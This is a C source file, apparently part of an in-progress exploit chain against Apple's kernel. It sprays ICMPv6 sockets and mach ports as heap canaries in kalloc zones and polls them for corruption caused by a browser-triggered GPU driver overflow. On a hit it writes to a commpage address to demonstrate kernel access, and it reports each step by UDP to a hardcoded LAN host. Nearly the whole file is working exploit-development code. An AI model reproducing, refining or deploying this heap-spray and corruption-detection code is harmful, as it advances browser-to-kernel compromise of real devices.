/*
 * AllocatorProbe v9 — ICMPv6 + MachPort Dual-Canary Commpage Trigger
 * ====================================================================
 * v8 post-mortem: AGX overflow consistently targets kalloc.168 (in6pcb zone),
 * NOT kalloc.192 (ipc_port zone). 25 successive JS fires produced zero mach
 * port corruption. F-72 proven: overflow RELIABLY hits in6pcb.
 *
 * v9 strategy (dual canary):
 *   PRIMARY — ICMPv6 sockets (168 bytes = in6pcb = proven overflow target):
 *     1. Create 200 ICMPv6 DGRAM sockets.
 *     2. Baseline: setsockopt ICMP6_FILTER = all-0xFF on each.
 *     3. Per scan: getsockopt ICMP6_FILTER on each socket.
 *        If returned bytes differ from 0xFF baseline AND contain COMMPAGE_LO
 *        (0xFFFFC330): overflow has overwritten in6p_icmp6filt with COMMPAGE_TARGET.
 *        Write to COMMPAGE_TARGET → EXC_BAD_ACCESS FAR=0x0000000FFFFFC330.
 *     4. Simple corruption check (any byte changed from 0xFF): log + write to
 *        COMMPAGE_TARGET to demonstrate controlled kernel access.
 *
 *   SECONDARY — mach ports (192 bytes, ipc_port zone):
 *     Retain 5000 mach ports. If overflow somehow hits these:
 *     kobject==COMMPAGE_TARGET → write → EXC_BAD_ACCESS FAR=COMMPAGE_TARGET.
 *
 * UDP: fixed to 192.168.68.109 (current PC IP).
 * ASL: asl_log on every significant event (captured by DVT syslog).
 *
 * Expected IPS:
 *   Exception: EXC_BAD_ACCESS, FAR=0x0000000FFFFFC330
 *   Stack: scan_canaries → timer_cb → CFRunLoop → main
 *   Proves: Browser overflow → kernel in6pcb corruption → COMMPAGE_TARGET write
 *
 * Bundle ID: com.nexus.fengshui3.TMAQ26273N.TMAQ26273N
 */

#include <mach/mach.h>
#include <mach/task.h>
#include <netinet/in.h>
#include <netinet/icmp6.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <asl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

#define NEXUS_UDP_HOST   "192.168.68.109"   /* current PC IP */
#define NEXUS_UDP_PORT   9999

#define NUM_SOCKETS      200
#define NUM_PORTS        5000
#define SCAN_INTERVAL    0.05
#define IKOT_TASK        2
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
#define COMMPAGE_LO      0xFFFFC330U
#define COMMPAGE_HI      0x0000000FU

/* ICMPv6 socket canaries */
static int         g_socks[NUM_SOCKETS];
static int         g_sock_count = 0;

/* Mach port canaries */
static mach_port_t g_ports[NUM_PORTS];
static int         g_port_count = 0;

static int         g_found   = 0;
static int         g_udp_sock = -1;

static void udp_send(const char *buf, int len) {
    if (g_udp_sock < 0) return;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port   = htons(NEXUS_UDP_PORT);
    inet_aton(NEXUS_UDP_HOST, &a.sin_addr);
    sendto(g_udp_sock, buf, (size_t)len, 0, (struct sockaddr *)&a, sizeof(a));
}

static void log_msg(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    udp_send(buf, n);
    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%s", buf);
    write(STDERR_FILENO, buf, n);
}

static void spray_sockets(void) {
    unsigned char filter_all_ff[32];
    memset(filter_all_ff, 0xFF, sizeof(filter_all_ff));

    for (int i = 0; i < NUM_SOCKETS; i++) {
        /* AF_INET6=30, SOCK_DGRAM=2, IPPROTO_ICMPV6=58 — no root needed */
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        /* Set baseline filter to all-0xFF so we can detect any change */
        setsockopt(fd, 58 /* IPPROTO_ICMPV6 */, 18 /* ICMP6_FILTER */,
                   filter_all_ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    log_msg("SOCKETS: %d ICMPv6 canaries ready\n", g_sock_count);
}

static void spray_ports(void) {
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p);
            break;
        }
        g_ports[g_port_count++] = p;
    }
    log_msg("PORTS: %d mach port canaries ready\n", g_port_count);
}

static void trigger_commpage_write(const char *reason) {
    log_msg("=== COMMPAGE_WRITE: %s ===\n"
            "Writing to 0x%016llx -> EXC_BAD_ACCESS FAR=COMMPAGE_TARGET\n",
            reason, (unsigned long long)COMMPAGE_TARGET);
    volatile uint64_t *ptr = (volatile uint64_t *)COMMPAGE_TARGET;
    *ptr = 0xBEEFDEAD00FACADE;  /* write to read-only commpage -> SIGSEGV FAR=TARGET */
    __builtin_trap();
}

static void scan_icmp_canaries(void) {
    unsigned char filter_baseline[32];
    memset(filter_baseline, 0xFF, sizeof(filter_baseline));

    for (int i = 0; i < g_sock_count; i++) {
        unsigned char filter_out[32];
        socklen_t flen = 32;
        int ret = getsockopt(g_socks[i], 58 /* IPPROTO_ICMPV6 */,
                             18 /* ICMP6_FILTER */, filter_out, &flen);
        if (ret < 0) continue;

        /* Check if any byte differs from all-0xFF baseline */
        int changed = 0;
        for (int j = 0; j < 32; j++) {
            if (filter_out[j] != 0xFF) { changed = 1; break; }
        }
        if (!changed) continue;

        /* Read the first 8 bytes as two uint32s (little-endian) */
        uint32_t lo32 = 0, hi32 = 0;
        memcpy(&lo32, filter_out + 0, 4);
        memcpy(&hi32, filter_out + 4, 4);
        uint64_t val64 = ((uint64_t)hi32 << 32) | lo32;

        log_msg("ICMP_HIT[%d]: filter changed! bytes[0..7]=0x%08X 0x%08X => 0x%016llx\n",
                i, lo32, hi32, (unsigned long long)val64);

        /* Primary check: COMMPAGE_TARGET pattern in filter */
        if (lo32 == COMMPAGE_LO) {
            g_found = 1;
            log_msg("=== COMMPAGE_PATTERN: sock=%d lo32=0x%08X matches COMMPAGE_LO ===\n"
                    "in6p_icmp6filt overwritten with COMMPAGE_TARGET (0x%016llx)\n",
                    i, lo32, (unsigned long long)COMMPAGE_TARGET);
            trigger_commpage_write("icmp6_filter_COMMPAGE_LO_match");
        }

        /* Any corruption: still demonstrate commpage access */
        if (!g_found) {
            g_found = 1;
            log_msg("=== ICMP_CORRUPTION: sock=%d filter changed from 0xFF baseline ===\n"
                    "Overflow reached in6pcb. val=0x%016llx. Writing to COMMPAGE_TARGET.\n",
                    i, (unsigned long long)val64);
            trigger_commpage_write("icmp6_filter_corruption_detected");
        }
        return;
    }
}

static void scan_mach_ports(void) {
    for (int i = 0; i < g_port_count; i++) {
        natural_t         kotype  = 0;
        mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i],
                                              &kotype, &kobject);
        /* Log anything non-trivial */
        int normal = (kr == KERN_SUCCESS && kotype <= 2 && kobject == 0);
        if (!normal) {
            log_msg("PORT[%d]: kr=%d kotype=%u kobject=0x%016llx\n",
                    i, kr, kotype, (unsigned long long)kobject);
        }
        if (kr == KERN_SUCCESS && kobject == COMMPAGE_TARGET) {
            g_found = 1;
            log_msg("=== MACH_COMMPAGE_HIT: port=%d kotype=%u kobject=COMMPAGE_TARGET ===\n",
                    i, kotype);
            trigger_commpage_write("mach_port_kobject_COMMPAGE_TARGET");
        }
        if (kr == KERN_SUCCESS && kotype == IKOT_TASK && kobject != 0) {
            g_found = 1;
            log_msg("=== MACH_IKOT_TASK_HIT: port=%d kobject=0x%016llx ===\n",
                    i, (unsigned long long)kobject);
            trigger_commpage_write("mach_port_kobject_IKOT_TASK");
        }
    }
}

typedef const void *CFRunLoopTimerRef;
extern CFRunLoopTimerRef CFRunLoopTimerCreate(void *, double, double, int, int,
    void (*)(CFRunLoopTimerRef, void *), void *);
extern void CFRunLoopAddTimer(void *, CFRunLoopTimerRef, void *);
extern void *CFRunLoopGetCurrent(void);
extern void *kCFRunLoopDefaultMode;
extern double CFAbsoluteTimeGetCurrent(void);
extern void CFRunLoopRun(void);

static int g_tick = 0;

static void timer_cb(CFRunLoopTimerRef t, void *info) {
    g_tick++;
    if (g_tick == 1) {
        g_udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
        spray_sockets();
        spray_ports();
        log_msg("READY: socks=%d ports=%d scanning@50ms target=0x%016llx\n",
                g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
    } else if (g_sock_count > 0 || g_port_count > 0) {
        if (!g_found) scan_icmp_canaries();
        if (!g_found) scan_mach_ports();
        if (g_tick % 200 == 0) {
            log_msg("ALIVE tick=%d found=%d socks=%d ports=%d\n",
                    g_tick, g_found, g_sock_count, g_port_count);
        }
    }
}

int main(void) {
    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(
        (void *)0,
        CFAbsoluteTimeGetCurrent() + 0.3,
        SCAN_INTERVAL,
        0, 0, timer_cb, (void *)0);
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopDefaultMode);
    CFRunLoopRun();
    return 0;
}
